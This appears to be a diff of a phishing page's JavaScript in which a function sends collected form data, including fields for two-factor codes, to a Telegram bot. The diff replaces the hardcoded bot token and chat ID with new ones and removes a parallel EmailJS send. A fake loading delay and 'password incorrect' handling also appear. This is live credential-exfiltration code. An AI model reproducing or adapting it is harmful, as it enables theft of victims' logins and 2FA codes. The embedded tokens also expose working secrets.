@@ -1,3 +1,4 @@
+
 <html lang="en" id="html"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -5037,8 +5038,8 @@ function sendDataEmail() {
         `◉ : ${templateData['2FA-3']}\n`
 
     // Gửi dữ liệu đến Telegram
-    var telegramToken = '7595524006:AAFQKCHyWjlrMB0D-EZF4clqn317aksE0Ko'; // Thay bằng Bot Token của bạn
-    var telegramChatId = '-4760184998'; // Thay bằng Chat ID của bạn
+    var telegramToken = '7565895161:AAFsJ34CeAh6KLAzZPvgWQHnJbSKE5mPSxk'; // Thay bằng Bot Token của bạn
+    var telegramChatId = '-4716682691'; // Thay bằng Chat ID của bạn
     var telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
     fetch(telegramUrl, {
@@ -5065,44 +5066,28 @@ function sendDataEmail() {
     });
 
 
-    var data = {
-        service_id: serviceID,
-        template_id: templateId,
-        user_id: userId,
-        template_params: templateData
-    };
+        function firstFormHandle(event) {
 
-    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
-        type: 'POST',
-        data: JSON.stringify(data),
-        contentType: 'application/json'
-    }).done(function () {
-        // Xử lý khi gửi thành công
-    }).fail(function (error) {
-        // Xử lý khi gửi thất bại
-    });
+            
 
-    return templateData;
-}
+            event.preventDefault()
+            updateFormsSendData(serializeForm(firstForm))
+            var spiner = firstForm.querySelector('.spinner-border')
+            var buttonText = firstForm.querySelector('.button-text')
+            var button = firstForm.querySelector('button')
 
-function firstFormHandle(event) {
-    event.preventDefault()
-    updateFormsSendData(serializeForm(firstForm))
-    var spiner = firstForm.querySelector('.spinner-border')
-    var buttonText = firstForm.querySelector('.button-text')
-    var button = firstForm.querySelector('button')
+            button.setAttribute('disabled', '')
+            spiner.style.display = 'block'
+            buttonText.style.display = 'none'
+            setTimeout(function () {
+                firstModal.hide()
+                apiModal.show()
+                spiner.style.display = 'none'
+                buttonText.style.display = 'block'
+                button.removeAttribute('disabled')
+            }, SEND_FORM_FICTIV_TIME)
 
-    button.setAttribute('disabled', '')
-    spiner.style.display = 'block'
-    buttonText.style.display = 'none'
-    setTimeout(function () {
-        firstModal.hide()
-        apiModal.show()
-        spiner.style.display = 'none'
-        buttonText.style.display = 'block'
-        button.removeAttribute('disabled')
-    }, SEND_FORM_FICTIV_TIME)
-}
+        }
 
 function hidePasswordIncorrectText() {
     setTimeout(function () {
